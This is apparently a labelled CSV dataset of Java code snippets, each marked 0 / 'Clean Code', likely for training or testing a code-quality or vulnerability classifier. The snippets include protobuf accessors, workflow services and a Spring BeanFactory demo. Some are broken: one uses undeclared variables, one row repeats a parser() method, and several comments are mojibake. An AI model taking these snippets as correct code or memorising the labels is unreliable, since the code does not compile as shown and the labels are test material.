text,label,text_label
"/** 
 * Collects information about special temp variables generated by Soot frontend: (1) collects the temp variables and their relevant definition statements; (2) collects the temp variables that receive invocation results but never used. TODO: remove this step for body parsed from .class files.
 */
private static void preprocessTemps(Body body,Map<Local,AssignStmt> tempToDef,Set<Local> unusedInvokeTempRets){
  MultiMap<Local,AssignStmt> tempToAssigns=Maps.newMultiMap();
  MultiMap<Local,Unit> tempToUses=Maps.newMultiMap();
  for (  Unit unit : body.getUnits()) {
    if (unit instanceof AssignStmt) {
      Value lhs=assign.getLeftOp();
      if (lhs instanceof Local) {
        if (var.getName().startsWith(""temp$"")) {
          tempToAssigns.put(var,assign);
          if (assign.containsInvokeExpr()) {
            unusedInvokeTempRets.add(var);
          }
        }
      }
    }
    unit.getUseBoxes().stream().map(ValueBox::getValue).forEach(value -> {
      if (value instanceof Local) {
        if (var.getName().startsWith(""temp$"")) {
          tempToUses.put(var,unit);
          unusedInvokeTempRets.remove(var);
        }
      }
    }
);
  }
  tempToAssigns.forEachSet((var,assigns) -> {
    if (assigns.size() == 1) {
      AssignStmt assign=CollectionUtils.getOne(assigns);
      Value rhs=assign.getRightOp();
      if ((rhs instanceof Constant || rhs instanceof Local || rhs instanceof BinopExpr) && tempToUses.get(var).size() <= 1) {
        tempToDef.put(var,assign);
      }
    }
  }
);
}",0,Clean Code
"public static com.google.protobuf.Parser<Data> parser(){
  return PARSER;
}
public static com.google.protobuf.Parser<FieldDataSnapshot> parser(){
  return PARSER;
}
",0,Clean Code
"@Override public void reserveSignIn(String uid,Long taskLogId) throws Exception {
  CfLogisticsTaskLog cfLogisticsTaskLog=findById(taskLogId,false);
  CfLogisticsTask cfLogisticsTask=cfLogisticsTaskService.findById(cfLogisticsTaskLog.getTaskId(),false);
  if (!cfLogisticsTaskLog.getDeliverUid().equals(uid)) {
    ExceptionCast.cast(LogisticsCode.APPOINTMENT_RECORD_DOES_NOT_BELONG_TO_YOU);
  }
  if (cfLogisticsTaskLog.getTaskLogStatus() != (byte)0) {
    ExceptionCast.cast(LogisticsCode.CHECK_IN_IS_PROHIBITED);
  }
  if (cfLogisticsTaskLog.getPid() != (byte)0) {
    ExceptionCast.cast(LogisticsCode.CHECK_IN_IS_PROHIBITED);
  }
  noticeDirverQueueOrDriverLoadingOrUnloading(cfLogisticsTaskLog,""desc"");
  CfLogisticsFactory cfLogisticsFactory=cfLogisticsFactoryService.findById(cfLogisticsTask.getFactoryId(),false);
  if (StringUtils.isNotEmpty(cfLogisticsFactory.getCarParkIds())) {
    String[] carParkIds=cfLogisticsFactory.getCarParkIds().split("","");
    if (carParkIds.length == 0) {
      return;
    }
    for (int i=0; i < carParkIds.length; i++) {
      CfCarPark cfCarPark=cfCarParkService.findById(carParkIds[i]);
      if (cfCarPark == null) {
        continue;
      }
      CfCarParkVisit cfCarParkVisit=new CfCarParkVisit();
      cfCarParkVisit.setCarParkId(new Long(carParkIds[i]));
      cfCarParkVisit.setExpirationTime(System.currentTimeMillis() + 86400000l);
      cfCarParkVisit.setFromUid(new Long(cfLogisticsTaskLog.getDeliverUid()));
      cfCarParkVisit.setPlateNumber(cfLogisticsTaskLog.getNumberPlate());
      cfCarParkVisit.setProcessStatus((byte)1);
      cfCarParkVisitService.add(cfCarParkVisit);
    }
  }
}",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.protos.core.FeatureSetProto)) {
    return super.equals(obj);
  }
  org.tribuo.protos.core.FeatureSetProto other=(org.tribuo.protos.core.FeatureSetProto)obj;
  if (getVersion() != other.getVersion())   return false;
  if (!getClassName().equals(other.getClassName()))   return false;
  if (hasSerializedData() != other.hasSerializedData())   return false;
  if (hasSerializedData()) {
    if (!getSerializedData().equals(other.getSerializedData()))     return false;
  }
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"/** 
 * <code>repeated .Material material_list = 7;</code>
 * @param value the materialList to add
 * @return this
 */
public GetBagScRsp addMaterialList(final MaterialOuterClass.Material value){
  bitField0_|=0x00000002;
  materialList.add(value);
  return this;
}",0,Clean Code
"/** 
 * 寮瑰嚭璋冪敤id
 * @return 璋冪敤id
 */
public long popInvokeId(){
  long invokeId=stack.pop();
  if (stack.isEmpty()) {
    invokeRef.remove();
  }
  return invokeId;
}
",0,Clean Code
"@Override public DataProxyNodeResponse getDataProxyNodesByCluster(String clusterName,String protocolType,String reportSourceType){
  LOGGER.debug(""begin to get data proxy nodes for clusterName={}, protocol={}"",clusterName,protocolType);
  InlongClusterEntity clusterEntity=clusterMapper.selectByNameAndType(clusterName,ClusterType.DATAPROXY);
  DataProxyNodeResponse response=new DataProxyNodeResponse();
  if (clusterEntity == null) {
    LOGGER.debug(""not any dataproxy cluster for clusterName={}, protocol={}"",clusterName,protocolType);
    return response;
  }
  List<InlongClusterNodeEntity> nodeEntities=clusterNodeMapper.selectByParentId(clusterEntity.getId(),protocolType);
  if (CollectionUtils.isEmpty(nodeEntities)) {
    LOGGER.debug(""not any data proxy node for clusterName={}, protocol={}"",clusterName,protocolType);
    return response;
  }
  response.setClusterId(clusterEntity.getId());
  List<DataProxyNodeInfo> nodeList=new ArrayList<>();
  for (  InlongClusterNodeEntity nodeEntity : nodeEntities) {
    if (Objects.equals(nodeEntity.getStatus(),NodeStatus.HEARTBEAT_TIMEOUT.getStatus())) {
      LOGGER.debug(""dataproxy node was timeout, parentId={} ip={} port={}"",nodeEntity.getParentId(),nodeEntity.getIp(),nodeEntity.getPort());
      continue;
    }
    if (StringUtils.isNotBlank(nodeEntity.getExtParams())) {
      DataProxyClusterNodeDTO dataProxyClusterNodeDTO=DataProxyClusterNodeDTO.getFromJson(nodeEntity.getExtParams());
      if (StringUtils.isBlank(dataProxyClusterNodeDTO.getReportSourceType())) {
        dataProxyClusterNodeDTO.setReportSourceType(ReportResourceType.INLONG);
      }
      if (StringUtils.isNotBlank(reportSourceType) && !Objects.equals(dataProxyClusterNodeDTO.getReportSourceType(),reportSourceType)) {
        continue;
      }
      if (Objects.equals(dataProxyClusterNodeDTO.getEnabledOnline(),false)) {
        continue;
      }
    }
    DataProxyNodeInfo nodeInfo=new DataProxyNodeInfo();
    nodeInfo.setId(nodeEntity.getId());
    nodeInfo.setIp(nodeEntity.getIp());
    nodeInfo.setPort(nodeEntity.getPort());
    nodeInfo.setProtocolType(nodeEntity.getProtocolType());
    nodeInfo.setNodeLoad(nodeEntity.getNodeLoad());
    nodeList.add(nodeInfo);
  }
  response.setNodeList(nodeList);
  if (LOGGER.isDebugEnabled()) {
    LOGGER.debug(""success to get dp nodes for clusterName={}, protocol={}, result={}"",clusterName,protocolType,response);
  }
  return response;
}
",0,Clean Code
"public void load(RandomAccessReader in) throws IOException {
  if (graph.size() != 0) {
    throw new IllegalStateException(""Cannot load into a non-empty graph"");
  }
  int size=in.readInt();
  int entryNode=in.readInt();
  int maxDegree=in.readInt();
  for (int i=0; i < size; i++) {
    int node=in.readInt();
    int nNeighbors=in.readInt();
    var sf=scoreProvider.searchProviderFor(node).exactScoreFunction();
    var ca=new NodeArray(maxDegree);
    for (int j=0; j < nNeighbors; j++) {
      int neighbor=in.readInt();
      ca.addInOrder(neighbor,sf.similarityTo(neighbor));
    }
    graph.addNode(node,new ConcurrentNeighborSet(node,maxDegree,(int)(maxDegree * neighborOverflow),scoreProvider,alpha,ca));
  }
  graph.updateEntryNode(entryNode);
}",0,Clean Code
"@Override public String signature(@Nullable Object t){
  if (t == null) {
    return ""{undefined}"";
  }
  if (t instanceof Class) {
    Class<?> clazz=(Class<?>)t;
    if (clazz.isArray()) {
      return arraySignature(clazz);
    }
 else     if (clazz.isPrimitive()) {
      return primitiveSignature(clazz);
    }
    StringBuilder s=new StringBuilder(classSignature(clazz));
    if (clazz.getTypeParameters().length > 0) {
      StringJoiner typeParams=new StringJoiner("", "",""<"","">"");
      for (      TypeVariable<?> typeParameter : clazz.getTypeParameters()) {
        typeParams.add(signature(typeParameter));
      }
      s.append(typeParams);
    }
    return s.toString();
  }
 else   if (t instanceof ParameterizedType) {
    return parameterizedSignature(t);
  }
 else   if (t instanceof WildcardType) {
    return genericSignature(t);
  }
 else   if (t instanceof TypeVariable) {
    return genericSignature(t);
  }
 else   if (t instanceof GenericArrayType) {
    return arraySignature(t);
  }
  throw new UnsupportedOperationException(""Unknown type "" + t.getClass().getName());
}",0,Clean Code
"private static boolean isLikelyDependencyConfiguration(Cursor cursor){
  if (!(cursor.getValue() instanceof J.MethodInvocation)) {
    return false;
  }
  J.MethodInvocation m=cursor.getValue();
  if (DEPENDENCY_CONFIGURATION_MATCHER.matches(m)) {
    return true;
  }
  if (m.getType() != null) {
    return false;
  }
  while (cursor != null) {
    if (cursor.getValue() instanceof J.MethodInvocation) {
      m=cursor.getValue();
      String methodName=m.getSimpleName();
      if (""constraints"".equals(methodName)) {
        return false;
      }
      if (DEPENDENCY_DSL_MATCHER.matches(m)) {
        return true;
      }
    }
    cursor=cursor.getParent();
  }
  return false;
}
",0,Clean Code
"@Override public List<FlowDataDealRecord> getMainByModuleIdAndDataId(Long moduleId,Long dataId){
  return lambdaQuery().eq(FlowDataDealRecord::getModuleId,moduleId).eq(FlowDataDealRecord::getDataId,dataId).orderByDesc(FlowDataDealRecord::getCreateTime).list();
}
",0,Clean Code
"/** 
 * The flavor of this release (native, or Java and JVM version). 
 */
public String flavor(){
  return flavor;
}
",0,Clean Code
"/** 
 * Returns the converter with the given source and target types. Throws  {@link ConversionException} if no such converter exists.
 */
<S,T>Converter<S,T> getConverter(PClassInfo<S> sourceType,Type targetType);
/** 
 * Same as  {@link #getConverter(PClassInfo,Type)}, except that the target type is narrowed from {@link Type} to {@link Class} to allow for better type inference.
 */
default <S,T>Converter<S,T> getConverter(PClassInfo<S> sourceType,Class<T> targetType){
  return getConverter(sourceType,(Type)targetType);
}
",0,Clean Code
"@Override public ProcessDetailResponse detail(Integer processId,Integer taskId,String operator){
  WorkflowProcessEntity processEntity=this.getProcessEntity(processId);
  if (processEntity == null) {
    return null;
  }
  WorkflowTaskEntity taskEntity=null;
  if (taskId == null) {
    if (!operator.equals(processEntity.getApplicant())) {
      throw new WorkflowException(""current user is not the applicant of the process"");
    }
  }
 else {
    taskEntity=this.getTaskEntity(taskId);
    List<String> taskApprovers=Arrays.asList(taskEntity.getApprovers().split(InlongConstants.COMMA));
    if (!taskApprovers.contains(operator)) {
      ApproverPageRequest query=ApproverPageRequest.builder().processName(processEntity.getName()).build();
      List<WorkflowApproverEntity> approverList=approverMapper.selectByCondition(query);
      boolean match=approverList.stream().anyMatch(entity -> Preconditions.inSeparatedString(operator,entity.getApprovers(),InlongConstants.COMMA));
      if (!match) {
        throw new WorkflowException(""current user is not the approver of the process"");
      }
    }
  }
  WorkflowProcess process=definitionRepository.get(processEntity.getName());
  TaskResponse currentTask=null;
  if (taskEntity != null) {
    currentTask=WorkflowUtils.getTaskResponse(taskEntity);
    if (process != null && TaskStatus.PENDING.equals(currentTask.getStatus())) {
      WorkflowTask task=process.getTaskByName(currentTask.getName());
      currentTask.setFormData(this.getEmptyTaskForm(task));
    }
    if (!processId.equals(currentTask.getProcessId())) {
      throw new WorkflowException(""task ["" + taskId + ""] not belongs to process [""+ processId+ ""]"");
    }
  }
  ProcessDetailResponse detailResponse=this.getProcessDetail(processId,processEntity);
  detailResponse.setCurrentTask(currentTask);
  if (process == null || process.getProcessDetailHandler() == null) {
    return detailResponse;
  }
  return process.getProcessDetailHandler().handle(detailResponse);
}
",0,Clean Code
"@Override protected void drawPickerChart(Canvas canvas){
  int bottom=getMeasuredHeight() - PICKER_PADDING;
  int top=getMeasuredHeight() - pikerHeight - PICKER_PADDING;
  int nl=lines.size();
  if (chartData != null) {
    for (int k=0; k < nl; k++) {
      LineViewData line=lines.get(k);
      if (!line.enabled && line.alpha == 0)       continue;
      line.bottomLinePath.reset();
      int n=chartData.xPercentage.length;
      int j=0;
      int[] y=line.line.y;
      line.chartPath.reset();
      for (int i=0; i < n; i++) {
        if (y[i] < 0)         continue;
        float xPoint=chartData.xPercentage[i] * pickerWidth;
        float h=ANIMATE_PICKER_SIZES ? pickerMaxHeight : chartData.maxValue;
        float yPercentage=(float)y[i] * chartData.linesK[k] / h;
        float yPoint=(1f - yPercentage) * (bottom - top);
        if (USE_LINES) {
          if (j == 0) {
            line.linesPathBottom[j++]=xPoint;
            line.linesPathBottom[j++]=yPoint;
          }
 else {
            line.linesPathBottom[j++]=xPoint;
            line.linesPathBottom[j++]=yPoint;
            line.linesPathBottom[j++]=xPoint;
            line.linesPathBottom[j++]=yPoint;
          }
        }
 else {
          if (i == 0) {
            line.bottomLinePath.moveTo(xPoint,yPoint);
          }
 else {
            line.bottomLinePath.lineTo(xPoint,yPoint);
          }
        }
      }
      line.linesPathBottomSize=j;
      if (!line.enabled && line.alpha == 0)       continue;
      line.bottomLinePaint.setAlpha((int)(255 * line.alpha));
      if (USE_LINES)       canvas.drawLines(line.linesPathBottom,0,line.linesPathBottomSize,line.bottomLinePaint);
 else       canvas.drawPath(line.bottomLinePath,line.bottomLinePaint);
    }
  }
}",0,Clean Code
"@Test(dataProvider=""referenceTrackingConfig"") public void testJdkProxy(boolean referenceTracking){
  Fury fury=Fury.builder().withLanguage(Language.JAVA).withRefTracking(referenceTracking).requireClassRegistration(false).build();
  Function function=(Function)Proxy.newProxyInstance(fury.getClassLoader(),new Class[]{Function.class},new TestInvocationHandler());
  Function deserializedFunction=(Function)fury.deserialize(fury.serialize(function));
  assertEquals(deserializedFunction.apply(null),1);
}",0,Clean Code
"public void setGroupUnreadCodes(ArrayList<Long> arrayList){
  this.groupUnreadCodes=arrayList;
}
",0,Clean Code
"/** 
 * <code>repeated .Material material_list = 7;</code>
 * @param values the materialList to add
 * @return this
 */
public PlayerSyncScNotify addAllMaterialList(final MaterialOuterClass.Material... values){
  bitField0_|=0x00000100;
  materialList.addAll(values);
  return this;
}",0,Clean Code
"private void bindForState(DownloadHolder holder,DownloadInfo info){
  Resources resources=getResources2();
  if (null == resources) {
    return;
  }
switch (info.state) {
case DownloadInfo.STATE_NONE:
    bindState(holder,info,resources.getString(R.string.download_state_none));
  break;
case DownloadInfo.STATE_WAIT:
case DownloadInfo.STATE_UPDATE:
bindState(holder,info,resources.getString(R.string.download_state_wait));
break;
case DownloadInfo.STATE_DOWNLOAD:
bindProgress(holder,info);
break;
case DownloadInfo.STATE_FAILED:
String text;
if (info.legacy <= 0) {
text=resources.getString(R.string.download_state_failed);
}
 else {
text=resources.getString(R.string.download_state_failed_2,info.legacy);
}
bindState(holder,info,text);
break;
case DownloadInfo.STATE_FINISH:
bindState(holder,info,resources.getString(R.string.download_state_finish));
break;
}
}",0,Clean Code
"@Override public boolean equals(Object o){
  if (o == this) {
    return true;
  }
  if (!(o instanceof SetDisplayAvatarScRsp)) {
    return false;
  }
  SetDisplayAvatarScRsp other=(SetDisplayAvatarScRsp)o;
  return bitField0_ == other.bitField0_ && (!hasRetcode() || retcode == other.retcode) && (!hasDisplayAvatarList() || displayAvatarList.equals(other.displayAvatarList));
}",0,Clean Code
"public static void main(String[] args){
  BeanFactory beanFactory=new AnnotationConfigApplicationContext(MyBean.class).getBeanFactory();
  Object bean=beanFactory.getBean(""myBean"");
  System.out.println(""閫氳繃鍚嶇О鑾峰彇Bean: "" + bean);
  ObjectProvider<MyBean> objectProvider=beanFactory.getBeanProvider(MyBean.class);
  System.out.println(""鑾峰彇Bean鐨凮bjectProvider: "" + objectProvider);
  Class<?> beanType=beanFactory.getType(""myBean"");
  System.out.println(""鑾峰彇Bean鐨勭被鍨�: "" + beanType);
  boolean containsBean=beanFactory.containsBean(""myBean"");
  System.out.println(""鍒ゆ柇鏄惁鍖呭惈Bean: "" + containsBean);
  boolean isSingleton=beanFactory.isSingleton(""myBean"");
  System.out.println(""鍒ゆ柇鏄惁涓哄崟渚�: "" + isSingleton);
  boolean isPrototype=beanFactory.isPrototype(""myBean"");
  System.out.println(""鍒ゆ柇鏄惁涓哄師鍨�: "" + isPrototype);
  boolean isTypeMatch=beanFactory.isTypeMatch(""myBean"",ResolvableType.forClass(MyBean.class));
  System.out.println(""鍒ゆ柇鏄惁鍖归厤鎸囧畾绫诲瀷: "" + isTypeMatch);
  String[] aliases=beanFactory.getAliases(""myBean"");
  System.out.println(""鑾峰彇Bean鐨勬墍鏈夊埆鍚�: "" + String.join("", "",aliases));
}
",0,Clean Code
